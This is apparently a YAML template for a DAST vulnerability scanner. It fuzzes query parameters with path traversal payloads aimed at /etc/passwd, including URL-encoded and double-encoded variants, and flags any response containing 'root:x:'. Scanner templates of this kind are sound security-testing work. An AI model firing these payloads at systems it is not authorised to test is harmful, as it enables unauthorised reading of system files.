http:
- fuzzing:
  - fuzz:
    - '{{lfi}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - 'root:x:'
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    lfi:
    - ../../../../../../etc/passwd
    - ..%2F..%2F..%2F..%2Fetc%2Fpasswd
    - ..%252f..%252f..%252f..%252fetc%252fpasswd
  stop-at-first-match: true
id: ai-fuzz-lfi-basic
info:
  author: openai
  name: LFI Basic Traversal
  severity: high
  tags: lfi,dast
